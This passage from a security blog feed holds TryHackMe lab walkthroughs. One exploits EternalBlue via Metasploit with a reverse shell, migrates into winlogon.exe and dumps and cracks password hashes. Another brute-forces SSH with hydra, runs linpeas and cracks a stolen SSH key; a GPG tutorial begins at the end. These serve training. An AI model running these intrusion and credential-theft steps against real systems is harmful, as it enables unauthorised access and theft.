</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>....
</span></span><span style="display:flex;"><span>....
</span></span></code></pre></div><ul>
<li>Came back with these results and noticed ports <code>138</code> and <code>445</code>, which are usually SMB so I ran nmap with specific SMB scripts:</li>
</ul>
<h1 id="heading-2"></h1>
<p><em>the first one could work but I don&rsquo;t think my VM could handle it so I did a little research and ran the second cmd</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v --script<span style="color:#f92672">=</span>smb* -oN scripts 10.10.10.13
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nmap -v --script<span style="color:#f92672">=</span>smb-vuln-ms17-010 -oN smbscript 10.10.10.13
</span></span></code></pre></div><ul>
<li>The results of the SMB scan were:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE SERVICE
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server
</span></span><span style="display:flex;"><span>....
</span></span><span style="display:flex;"><span>....
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb-vuln-ms17-010: 
</span></span><span style="display:flex;"><span>|   VULNERABLE:
</span></span><span style="display:flex;"><span>|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|     State: VULNERABLE
</span></span><span style="display:flex;"><span>|     IDs:  CVE:CVE-2017-0143
</span></span><span style="display:flex;"><span>|     Risk factor: HIGH
</span></span><span style="display:flex;"><span>|       A critical remote code execution vulnerability exists in Microsoft SMBv1
</span></span><span style="display:flex;"><span>|        servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>|           
</span></span><span style="display:flex;"><span>|     Disclosure date: 2017-03-14
</span></span><span style="display:flex;"><span>|     References:
</span></span><span style="display:flex;"><span>|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-
</span></span><span style="display:flex;"><span>wannacrypt-attacks/
</span></span><span style="display:flex;"><span>|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
</span></span><span style="display:flex;"><span>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2017-0143
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC:-
</span></span><span style="display:flex;"><span>02:8d:e0:a6:1c:6f <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| Names:
</span></span><span style="display:flex;"><span>|   JON-PC&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span style="display:flex;"><span>|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span style="display:flex;"><span>|   JON-PC&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span style="display:flex;"><span>|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span style="display:flex;"><span>|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>02__MSBROWSE__<span style="color:#ae81ff">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
</span></span><span style="display:flex;"><span>| smb-os-discovery: 
</span></span><span style="display:flex;"><span>|   OS: Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">7</span> Professional 6.1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
</span></span><span style="display:flex;"><span>|   Computer name: Jon-PC
</span></span><span style="display:flex;"><span>|   NetBIOS computer name: JON-PC<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span>|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span>|_  System time: 2022-09-23T10:23:28-05:00
</span></span><span style="display:flex;"><span>| smb-security-mode: 
</span></span><span style="display:flex;"><span>|   account_used: guest
</span></span><span style="display:flex;"><span>|   authentication_level: user
</span></span><span style="display:flex;"><span>|   challenge_response: supported
</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   2.02: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2022-09-23 16:23:28
</span></span><span style="display:flex;"><span>|_  start_date: 2022-09-23 16:17:45
</span></span></code></pre></div><ul>
<li>Found that the vulnerability in SMB was <code>HIGH</code>, and went to Metasploit to find an expoit to attempt.</li>
</ul>
<h1 id="heading-3"></h1>
<h2 id="gain-access">Gain Access</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   -  ----                                      ---------------  ----     -----  ----
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     
</span></span><span style="display:flex;"><span>MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command
</span></span><span style="display:flex;"><span>Execution
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>  auxiliary/scanner/smb/smb_ms17_010                         normal   No      
</span></span><span style="display:flex;"><span>MS17-010 SMB RCE Detection
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes     
</span></span><span style="display:flex;"><span>MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes     
</span></span><span style="display:flex;"><span>MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code 
</span></span><span style="display:flex;"><span>Execution
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes     
</span></span><span style="display:flex;"><span>SMB DOUBLEPULSAR Remote Code Execution
</span></span></code></pre></div><ul>
<li>
<p>I noticed the scanner module and decided to verify the vulnerability with it, which it confirmed the vulnerability.</p>
</li>
<li>
<p>Then I tried index 2 exploit.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 &gt; use <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>set payload windows/x64/shell/reverse_tcp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>run
</span></span></code></pre></div><p><em>May have to press ENTER to make the CMD prompt open.</em></p>
<ul>
<li>Then press <code>CTRL+z</code> to push this shell session to the background.</li>
</ul>
<h1 id="heading-4"></h1>
<h2 id="escalate">Escalate</h2>
<ul>
<li>
<p>Then you can try to escalate the standard shell session to an escalated meterpreter session.</p>
</li>
<li>
<p>Select the <code>shell_to_meterpreter</code> module.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;^Z
</span></span><span style="display:flex;"><span>Background session 1? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span>  y
</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; back
</span></span><span style="display:flex;"><span>msf5 &gt; search shell_to_meterpreter
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Matching Modules
</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                  Disclosure Date  Rank    Check  Desc.</span>
</span></span><span style="display:flex;"><span>   -  ----                                  ---------------  ----    -----  --------
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  post/multi/manage/shell_to_meterpreter                 normal  No     Shell to 
</span></span><span style="display:flex;"><span>Meterpreter Upgrade
</span></span></code></pre></div><ul>
<li>
<p>List the modules options with <code>otpions</code></p>
</li>
<li>
<p>List the available sessions with <code>sessions -l</code>.</p>
</li>
<li>
<p>Set the option to the correct session and run.</p>
</li>
<li>
<p>After it completes <code>sessions -l</code> then <code>sessions -i &lt;ID#&gt;</code> to connect to that session.</p>
</li>
<li>
<p>Verified escalation by checking my user.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; shell
</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">1704</span> created.
</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">1</span> created.
</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
</span></span></code></pre></div><ul>
<li>Looking up processes on the machine and found that this one seemed interesting.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>---   ----  ----                  ----  -------  ----                          ----
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">668</span>   <span style="color:#ae81ff">608</span>   winlogon.exe          x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           -
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>inlogon.exe
</span></span></code></pre></div><ul>
<li>Then I migrated to <strong>winlogon.exe</strong> and was able to dump the password hashes on the system.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; migrate -P <span style="color:#ae81ff">668</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migrating from <span style="color:#ae81ff">748</span> to 668...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migration completed successfully.
</span></span><span style="display:flex;"><span>meterpreter &gt; 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; hashdump
</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
</span></span></code></pre></div><h1 id="heading-5"></h1>
<h2 id="cracking">Cracking</h2>
<ul>
<li>
<p>Then I took Jon&rsquo;s password hash <code>ffb43f0de35be4d9917ac0cc8ad57f8d</code>.</p>
</li>
<li>
<p>Used <a href="https://crackstation.net/">Crackstation.net</a> to crack the hash.</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>User</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>jon</td>
<td>alqfna22</td>
</tr>
</tbody>
</table>
<ul>
<li>Was able to login as Jon then started looking for flags.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; search -f flag*.txt
</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">3</span> results...
</span></span><span style="display:flex;"><span>    c:<span style="color:#ae81ff">\f</span>lag1.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">24</span> bytes<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\J</span>on<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\f</span>lag3.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">37</span> bytes<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    c:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig<span style="color:#ae81ff">\f</span>lag2.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">34</span> bytes<span style="color:#f92672">)</span>
</span></span></code></pre></div><h1 id="heading-6"></h1>
<h2 id="searching-for-flags">Searching for flags</h2>
<ul>
<li>Found flag1 by going to root C: drive and ls and catting flag1.txt</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>access_the_machine<span style="color:#f92672">}</span>
</span></span></code></pre></div><ul>
<li>Found flag2 looking for Windows Sam Config</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:/Windows/System32/config
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cat flag2.txt
</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>sam_database_elevated_access<span style="color:#f92672">}</span>
</span></span></code></pre></div><ul>
<li>Found flag3 in Jon&rsquo;s Documents folder.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; cat c:<span style="color:#ae81ff">\\</span>Users<span style="color:#ae81ff">\\</span>Jon<span style="color:#ae81ff">\\</span>Documents<span style="color:#ae81ff">\\</span>flag3.txt
</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>admin_documents_can_be_valuable<span style="color:#f92672">}</span>
</span></span></code></pre></div><h1 id="heading-7"></h1>
<h1 id="heading-8"></h1>
<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
]]></content>
        </item>
        
        <item>
            <title>THM_Basic_PenTest_Walkthrough</title>
            <link>https://xfafnir.com/posts/2022/09/thm_basic_pentest_walkthrough/</link>
            <pubDate>Sat, 17 Sep 2022 18:46:19 -0500</pubDate>
            
            <guid>https://xfafnir.com/posts/2022/09/thm_basic_pentest_walkthrough/</guid>
            <description>Basic PenTesting TryHackMe performed by: jb-williams Summary Hidden directory on webserver(development, found via dirbuster&amp;amp;rockyou).
Username (jan and kay found via enum4linux).
Password(jan:armando found via hydra with ssh).
Private SSH Key found with Linpeas.
Cracked SSH Key
Was able to login and read pass.bak
User Pass Service SSH Key IP Port jan armando ssh &amp;mdash;&amp;mdash;&amp;mdash;- 10.10.62.206 22 kay beeswax ssh kay_id_rsa 10.10.62.206 22 Ports Services 22 SSH 7.2 80 Apache 2.4.18 139 SMB 3.</description>
            <content type="html"><![CDATA[<h1 id="basic-pentesting-tryhackme">Basic PenTesting TryHackMe</h1>
<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
<h1 id="heading"></h1>
<h2 id="summary"><strong>Summary</strong></h2>
<ul>
<li>
<p>Hidden directory on webserver(<code>development</code>, found via dirbuster&amp;rockyou).</p>
</li>
<li>
<p>Username (<code>jan</code> and <code>kay</code> found via enum4linux).</p>
</li>
<li>
<p>Password(<code>jan:armando</code> found via hydra with ssh).</p>
</li>
<li>
<p>Private SSH Key found with Linpeas.</p>
</li>
<li>
<p>Cracked SSH Key</p>
</li>
<li>
<p>Was able to login and read <code>pass.bak</code></p>
</li>
</ul>
<table>
<thead>
<tr>
<th>User</th>
<th>Pass</th>
<th>Service</th>
<th>SSH Key</th>
<th>IP</th>
<th>Port</th>
</tr>
</thead>
<tbody>
<tr>
<td>jan</td>
<td>armando</td>
<td>ssh</td>
<td>&mdash;&mdash;&mdash;-</td>
<td>10.10.62.206</td>
<td>22</td>
</tr>
<tr>
<td>kay</td>
<td>beeswax</td>
<td>ssh</td>
<td>kay_id_rsa</td>
<td>10.10.62.206</td>
<td>22</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>Ports</th>
<th>Services</th>
</tr>
</thead>
<tbody>
<tr>
<td>22</td>
<td>SSH 7.2</td>
</tr>
<tr>
<td>80</td>
<td>Apache 2.4.18</td>
</tr>
<tr>
<td>139</td>
<td>SMB 3.X -4.X</td>
</tr>
<tr>
<td>445</td>
<td>SMB 4.3.11</td>
</tr>
<tr>
<td>8009</td>
<td>Apache Jserv 1.3</td>
</tr>
<tr>
<td>8080</td>
<td>Apache tomcat 9.0.7</td>
</tr>
</tbody>
</table>
<h2 id="scanning--enumeration">Scanning &amp; Enumeration</h2>
<ul>
<li>Scanned Machine on the network:</li>
</ul>
<p><strong>IP:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>10.10.62.206
</span></span></code></pre></div><ul>
<li>Discovered these ports and services running on the device.</li>
</ul>
<p><strong>Ports:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">22</span> - ssh 7.2
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">80</span> - apache 2.4.18
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">139</span> - SMB 3.X - 4.X
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">445</span> - SMB 4.3.11
</span></span><span style="display:flex;"><span>8009- Apache Jserv 1.3
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8080</span> Apache tomcat 9.0.7
</span></span></code></pre></div><ul>
<li>
<p>Began enumeration on the webpage on port 80 with Dirbuster:</p>
</li>
<li>
<p>Discovered:</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/development/*
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/development/dev.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/development/j.txt
</span></span></code></pre></div><ul>
<li>
<p><code>/development/dev.txt</code> talks about <code>Apache Struts 2.5.12</code>, as well as initials of what I assume are employees:</p>
<ul>
<li>Found initials: <code>-K</code> and <code>-J</code></li>
</ul>
</li>
<li>
<p>In <code>/development/j.txt</code>, found a message that was from <code>K</code> is telling <code>J</code> that they have a weak password that can be cracked easily.</p>
</li>
</ul>
<h2 id="brute-forcing">Brute Forcing</h2>
<ul>
<li>Ran enum4linux on the target IP, splitting the output to STDOUT and a file:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>enum4linux -a 10.10.62.206 | tee -a enum4linux.log
</span></span></code></pre></div><ul>
<li>
<p>Enum4linux found the full usernames <code>Kay</code> and <code>Jan</code>:</p>
</li>
<li>
<p>Bruteforced ssh to find <code>Jan's</code> password:</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l jan -P /usr/share/wordlist/rockyou.txt ssh://10.10.62.206
</span></span></code></pre></div><ul>
<li>Credentials that were Found:</li>
</ul>
<table>
<thead>
<tr>
<th>User</th>
<th>Pass</th>
<th>Service</th>
<th>IP</th>
<th>Port</th>
</tr>
</thead>
<tbody>
<tr>
<td>jan</td>
<td>armando</td>
<td>ssh</td>
<td>10.10.62.206</td>
<td>22</td>
</tr>
</tbody>
</table>
<ul>
<li>Verified login credentials.</li>
</ul>
<h2 id="internal-enumeration">Internal Enumeration</h2>
<ul>
<li>
<p>Logged into <code>jan</code>&rsquo;s  account through ssh.</p>
</li>
<li>
<p>I was able to move traverse over to <code>/home/kay</code>, and say there was a <code>pass.bak</code> file</p>
</li>
<li>
<p>However, I was unable to read anything in <code>/home/kay</code>.</p>
</li>
<li>
<p>From my host, I used ssh to transfer Linpeas to the Machine into the shared memory:</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp /opt/linpeas/linpeas.sh jan@10.10.62:/dev/shm
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ssh jan@10.10.62.206
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>chmod +x linpeas.sh <span style="color:#f92672">&amp;&amp;</span> ./linpeas.sh | tee linlog.txt
</span></span></code></pre></div><ul>
<li>This enumeration brought me to Kay&rsquo;s Private SSH key that I was able to read.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/home/kay/.ssh/id_rsa
</span></span></code></pre></div><ul>
<li>I copied to my host and changed the permissions on it.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> kay_id_rsa
</span></span></code></pre></div><ul>
<li>Discovered the SSH Key was password protected, so I sent it to <code>ssh2john</code>, out put it into a text doc to then run <code>john</code> on it.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 /usr/share/john/ssh2john.py kay_id_rsa &gt; forjohn.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>john forjohn.txt
</span></span></code></pre></div><ul>
<li>
<p>John found <code>kay's</code> password: <code>beeswax</code></p>
</li>
<li>
<p>SSH&rsquo;d into the machine as <code>Kay</code>:</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i kay_id_rsa kay@10.10.62.206
</span></span><span style="display:flex;"><span>beeswax
</span></span></code></pre></div><table>
<thead>
<tr>
<th>User</th>
<th>Pass</th>
<th>Service</th>
<th>SSH Key</th>
<th>IP</th>
<th>Port</th>
</tr>
</thead>
<tbody>
<tr>
<td>kay</td>
<td>beeswax</td>
<td>ssh</td>
<td>kay_id_rsa</td>
<td>10.10.62.206</td>
<td>22</td>
</tr>
</tbody>
</table>
<ul>
<li>As <code>Kay</code> I was able to read that <code>pass.bak</code> file:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat pass.bak
</span></span></code></pre></div><ul>
<li>With that I was able to find the Password/Last Flag:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>heresareallystrongpasswordthatfollowsthepasswordpolicy$$
</span></span></code></pre></div><h1 id="heading-1"></h1>
<h1 id="heading-2"></h1>
<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
]]></content>
        </item>
        
        <item>
            <title>GPG</title>
            <link>https://xfafnir.com/posts/2022/08/gpg/</link>
            <pubDate>Wed, 31 Aug 2022 17:54:28 -0500</pubDate>
            
            <guid>https://xfafnir.com/posts/2022/08/gpg/</guid>
            <description>GPG performed by: jb-williams GPG(GnuPrivacyGuard) is an Open Source implementation of PGP(PrettyGoodPrivacy). It allows you to encrypt/decrypt and sign data communications.
A quick walkthrough of GPG.
Works on most all OS&amp;rsquo;s, this will be a Linux, and quick Windows walkthrough.
Public/Private Keys:
You make a Public Key and a Private Key(always keep Private Key safe and do not share with anyone). You give you Public Key out to anyone. They use your Public Key to encrypt the message they want to send to you and you decrypt it with your Private Key.</description>
            <content type="html"><![CDATA[<h1 id="gpg">GPG</h1>
<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
<h1 id="heading"></h1>
<h1 id="heading-1"></h1>
<p>GPG(GnuPrivacyGuard) is an Open Source implementation of PGP(PrettyGoodPrivacy). It allows you to encrypt/decrypt and sign data communications.</p>
<p>A quick walkthrough  of GPG.</p>
<p>Works on most all OS&rsquo;s, this will be a Linux, and quick Windows walkthrough.</p>
<p>Public/Private Keys:</p>
<ul>
<li>You make a Public Key and a Private Key(always keep Private Key safe and do not share with anyone).</li>
<li>You give you Public Key out to anyone.</li>
<li>They use your Public Key to encrypt the message they want to send to you and you decrypt it with your Private Key.</li>
<li>You use their Public Key to encrypt a message you want to send to them and they decrypt it with their Private Key Calculating Key Counts based off of # of People Employees.</li>
<li>Symmetric Key count:
<ul>
<li>(N*(N-1))/2 = count of symmetric keys     - N = num of individuals</li>
</ul>
</li>
<li>Asymmetric Key Count:
<ul>
<li>N*2  \</li>
</ul>
<h1 id="heading-2"></h1>
</li>
</ul>
<h1 id="heading-3"></h1>
<h1 id="linux">Linux</h1>
<h2 id="step-1-create-a-key-pair">Step 1 Create a Key Pair</h2>
<p>The first step in using asymmetric encryption is to generate a key pair. We will be using Charles and Jack as example people.</p>
<ul>
<li>To create a Public/Private Key, Charles will enter the following command:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gpg --full-gen-key
</span></span></code></pre></div><ul>
<li>
<p>Next, Charles will be asked to enter the following info:</p>
<ul>
<li>
<p>Real Name:        What the user will name their key. We will use Charles.</p>
</li>
<li>
<p>Email Address:    Email associated with the key. We will use <a href="mailto:charles@email.com">charles@email.com</a>.</p>
</li>
<li>
<p><code>Change (N)ame, (E)mail, or (O)kay/(Q)uit?:</code> Enter <code>O</code> to confirm your information.</p>
</li>
<li>
<p>Passphrase:       A password for the encryption key. Anytime Private Key is used, passphrase will be verified:</p>
<ul>
<li>Select any passphrase, just make sure to remember it for later use.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Example Output:</p>
</li>
</ul>
